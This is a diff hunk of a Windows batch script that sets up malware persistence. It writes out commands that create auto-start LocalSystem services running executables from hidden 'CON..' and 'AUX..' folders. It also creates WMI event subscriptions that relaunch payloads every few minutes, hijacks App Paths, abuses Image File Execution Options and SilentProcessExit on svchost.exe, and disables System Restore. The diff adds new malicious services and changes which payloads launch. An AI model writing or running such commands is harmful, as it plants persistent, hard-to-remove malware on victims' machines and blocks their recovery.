@@ -26,26 +26,17 @@ reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\install.exe" /t REG_SZ /d "%USERPROFILE%\Cookies\ini.cmd" /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\setup.exe" /t REG_SZ /d "%WINDIR%\System32\oobe\Setup.exe" /f
 
-sc config Fax binPath="%ProgramData%\CON..\Input.exe %ProgramData%\CON..\Kape.dll" start="auto" obj="LocalSystem"
+sc create NetworkConfiguration binPath="%WINDIR%\System32\cmd.exe /c start start.exe" start="auto" obj="LocalSystem"
+sc create PerformanceMonitor binPath="%WINDIR%\System32\cmd.exe /c start install.exe" start="auto" obj="LocalSystem"
 sc create Update binPath="%ProgramData%\AUX..\Input.exe %ProgramData%\AUX..\Icon.dll" start="auto" obj="LocalSystem"
 
 wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="SCM", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 180 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
 wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="SCM", CommandLineTemplate="%WINDIR%\System32\cmd.exe /c start setup.exe"
 wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"SCM\"", Consumer="CommandLineEventConsumer.Name=\"SCM\""
 
-wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="Event", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
-wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="Event", CommandLineTemplate="%WINDIR%\System32\cmd.exe /c start install.exe"
-wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"Event\"", Consumer="CommandLineEventConsumer.Name=\"Event\""
-
-wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="Consumer", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 240 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
-wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="Consumer", CommandLineTemplate="%WINDIR%\System32\cmd.exe /c start start.exe"
-wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"Consumer\"", Consumer="CommandLineEventConsumer.Name=\"Consumer\""
-
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger /t REG_SZ /d "%WINDIR%\System32\cmd.exe /c start start.exe" /f
-
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\svchost.exe" /v ReportingMode /t REG_DWORD /d 1 /f /reg:64
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\svchost.exe" /v MonitorProcess /t REG_SZ /d "%WINDIR%\System32\cmd.exe /c start install.exe" /f /reg:64
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\svchost.exe" /v MonitorProcess /t REG_SZ /d "%WINDIR%\System32\cmd.exe /c start setup.exe" /f /reg:64
 
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f
